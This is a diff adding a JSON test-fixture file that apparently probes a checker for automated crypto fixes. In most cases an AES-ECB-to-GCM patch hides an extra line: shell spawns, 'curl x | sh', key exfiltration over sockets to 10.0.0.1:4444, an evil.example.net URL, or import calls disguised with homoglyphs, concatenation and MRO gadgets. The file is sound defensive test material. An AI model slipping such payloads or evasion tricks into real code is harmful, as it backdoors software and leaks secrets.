@@ -1,0 +1,1634 @@
+[
+ {
+  "id": "probe_fix: python: control: GCM ok",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    nonce = os.urandom(12)\n    return AES.new(key, AES.MODE_GCM, nonce=nonce).encrypt(data)\n",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix: python: from os import system",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom os import system\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    system('curl x | sh')\n    return AES.new(key, AES.MODE_GCM).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix: python: os.execv",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    os.execv('/bin/sh', ['sh','-c','id'])\n    return AES.new(key, AES.MODE_GCM).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix: python: os.spawnlp",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    os.spawnlp(os.P_NOWAIT, 'sh', 'sh', '-c', 'id')\n    return AES.new(key, AES.MODE_GCM).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix: python: os.posix_spawn",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    os.posix_spawn('/bin/sh', ['sh'], {})\n    return AES.new(key, AES.MODE_GCM).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix: python: getattr(os,'sys'+'tem')",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    getattr(os, 'sys' + 'tem')('id')\n    return AES.new(key, AES.MODE_GCM).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix: python: __builtins__ dict",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    __builtins__['__imp'+'ort__']('sock'+'et')\n    return AES.new(key, AES.MODE_GCM).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix: python: inline import x=1; import ctypes",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    x = 1; import ctypes\n    return AES.new(key, AES.MODE_GCM).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix: python: if True: import ctypes",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    if True: import ctypes\n    return AES.new(key, AES.MODE_GCM).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix: python: import builtins (not allowed?)",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    import builtins\n    return AES.new(key, AES.MODE_GCM).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix: python: inline key literal",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    return AES.new(b'0123456789abcdef', AES.MODE_GCM).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix: python: short name k=hex",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    k = bytes.fromhex('00112233445566778899aabbccddeeff')\n    return AES.new(k, AES.MODE_GCM).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix: python: short name k=b64",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    k = base64.b64decode('QUJDREVGR0hJSktMTU5PUA==')\n    return AES.new(k, AES.MODE_GCM).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix: python: key = literal (control)",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    key = 'QUJDREVGR0hJSktMTU5PUA=='\n    return AES.new(key, AES.MODE_GCM).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix: python: key via concat",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    key = 'QUJDREVGR0hJ' + 'SktMTU5PUA=='\n    return AES.new(key, AES.MODE_GCM).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix: python: url concat",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    u = 'https:' + '//evil' + '.example' + '.net/x'\n    return AES.new(key, AES.MODE_GCM).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix: python: url control",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    u = 'https://evil.example.net/x'\n    return AES.new(key, AES.MODE_GCM).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix: python: cyrillic exec (е)",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    еxec = 1\n    return AES.new(key, AES.MODE_GCM).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix: python: os.environ exfil open",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    open('/tmp/k','w').write(key.hex())\n    return AES.new(key, AES.MODE_GCM).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix: python: compile+eval alias",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    f = vars(__builtins__) if isinstance(__builtins__, dict) else vars(__builtins__)\n    return AES.new(key, AES.MODE_GCM).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix: python: subprocess ok-caught",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    import subprocess\n    return AES.new(key, AES.MODE_GCM).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix: python: far append",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)\n\n\n\n\n\n\n\n\n\n\nos.system('x')",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix: python: far import-only os",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)\n\n\n\n\n\n\n\n\n\n\nfrom os import execv",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix2: python: fullwidth os.ｓｙｓｔｅｍ",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    os.ｓｙｓｔｅｍ('id')\n    return AES.new(key, AES.MODE_GCM).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix2: python: fullwidth ｅｘｅｃ",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    ｅｘｅｃ('import socket')\n    return AES.new(key, AES.MODE_GCM).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix2: python: fullwidth __ｉｍｐｏｒｔ__",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    __ｉｍｐｏｒｔ__('socket').create_connection(('10.0.0.1', 4444))\n    return AES.new(key, AES.MODE_GCM).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix2: python: url 2 pieces",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    u = 'https://ev' + 'il.net/x'\n    return AES.new(key, AES.MODE_GCM).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix2: python: ip literal tuple",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    t = ('10.0.0.1', 4444)\n    return AES.new(key, AES.MODE_GCM).encrypt(data)\n",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix2: javascript: js require concat http",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n  return c.update(d);\n}",
+  "start": 1,
+  "line": 3,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nfunction enc(d, k) {\n  require('ht'+'tp').get('h'+'ttp://x');\n  const c = crypto.createCipheriv('aes-128-gcm', k, crypto.randomBytes(12));\n  return c.update(d);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix2: javascript: js globalThis fetch",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n  return c.update(d);\n}",
+  "start": 1,
+  "line": 3,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nfunction enc(d, k) {\n  globalThis['fe'+'tch']('/x');\n  const c = crypto.createCipheriv('aes-128-gcm', k, crypto.randomBytes(12));\n  return c.update(d);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix2: javascript: js require space",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n  return c.update(d);\n}",
+  "start": 1,
+  "line": 3,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const n = require ('net');\n  const c = crypto.createCipheriv('aes-128-gcm', k, crypto.randomBytes(12));\n  return c.update(d);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix2: javascript: js Function ctor",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n  return c.update(d);\n}",
+  "start": 1,
+  "line": 3,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nfunction enc(d, k) {\n  new Function('return pro'+'cess')();\n  const c = crypto.createCipheriv('aes-128-gcm', k, crypto.randomBytes(12));\n  return c.update(d);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix3: python: GOOD gcm",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    nonce = os.urandom(12)\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix3: python: GOOD aesgcm import",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCM\n\ndef encrypt(data, key):\n    nonce = os.urandom(12)\n    return nonce + AESGCM(key).encrypt(nonce, data, None)\n",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix3: python: GOOD env key",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    key = os.environ['APP_KEY'].encode()\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix3: python: import os as o; o.system",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nimport os as o\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    o.system('id')\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix3: python: mro gadget",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    ().__class__.__mro__[1].__subclasses__()\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix3: python: type() 3-arg",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    T = type('T', (object,), {'x': 1})\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix3: python: breakpoint()",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    breakpoint()\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix3: python: import pickle",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    import pickle; pickle.loads(data)\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix3: python: marshal",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    import marshal\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix3: python: import_module string",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    __import__('importlib').import_module('sock' + 'et')\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix3: python: ssl.create_connection",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nimport ssl\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    ssl.create_connection(('10.0.0.1', 4444)).sendall(key)\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix3: python: ssl.get_server_certificate",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nimport ssl\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    ssl.get_server_certificate(('10.0.0.1', 4444))\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix3: python: ssl.socket attr",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nimport ssl\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    ssl.socket.create_connection(('10.0.0.1', 4444))\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix3: python: from ssl import create_connection",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom ssl import create_connection\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    create_connection(('10.0.0.1', 4444)).sendall(key)\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix3: python: os.path.os.system",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    os.path.os.system('id')\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix3: python: str.format gadget",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    '{0.__globals__}'.format(encrypt)\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix3: python: decorator eval",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    pass\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix3: python: secrets.base64 hop",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nimport secrets\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    secrets.base64.b64encode(key)\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix3: python: env leak print",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(data)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    print(key.hex())\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix3: javascript: GOOD gcm",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const c = crypto.createCipheriv('aes-128-ecb', k, null);\n  return c.update(d);\n}",
+  "start": 1,
+  "line": 3,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nfunction enc(d, k) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', k, crypto.randomBytes(12));\n  return c.update(d);\n}",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix3: javascript: GOOD key from env",
+  "lang": "javascript",
